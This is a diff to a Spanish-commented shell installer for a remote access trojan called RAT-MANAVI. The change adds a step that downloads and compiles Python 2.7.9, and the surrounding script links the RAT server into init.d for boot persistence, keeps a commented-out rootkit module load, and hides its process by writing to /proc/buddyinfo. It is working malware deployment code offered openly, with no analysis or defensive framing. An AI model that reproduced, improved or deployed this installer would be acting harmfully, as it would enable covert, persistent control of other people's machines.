@@ -5,6 +5,8 @@ LOG_FILE=$RAT_DIR/rat.log
 
 MODPROBE=/sbin/modprobe
 INSMOD=/sbin/insmod
+PYTHON279_PREFIX=/usr/local/lib/
+PYTHON279=${PYTHON279_PREFIX}python2.7.9/bin/python
 
 RAT_USER=manavi
 SPORT=6660
@@ -60,6 +62,15 @@ apt-get -y install sshpass 1>/dev/null
 #Se habilita el modulo.
 $MODPROBE snd_pcm_oss 
 
+#Requesito especial para python2.7.9
+wget -q https://www.python.org/ftp/python/2.7.9/Python-2.7.9.tgz 
+tar xfz Python-2.7.9.tgz 1>/dev/null
+rm Python-2.7.9.tgz
+cd Python-2.7.9/
+./configure --prefix $PYTHON279_PREFIX''python2.7.9 1>/dev/null
+make 1>/dev/null
+make install 1>/dev/null
+
 #Agregar a init.d script server
 ln -s $RAT_DIR''RAT-MANAVI/server.py /etc/init.d/
 
@@ -68,8 +79,7 @@ ln -s $RAT_DIR''RAT-MANAVI/server.py /etc/init.d/
 #$INSMOD rootkit.ko
 
 #Ejecutar el server.py
-chmod +x $RAT_DIR''/RAT-MANAVI/server.py
-$RAT_DIR''/RAT-MANAVI/server.py
+$PYTHON279 $RAT_DIR''RAT-MANAVI/server.py
 
 #Ocultar proceso
 echo "hpid $$" > /proc/buddyinfo 2>/dev/null
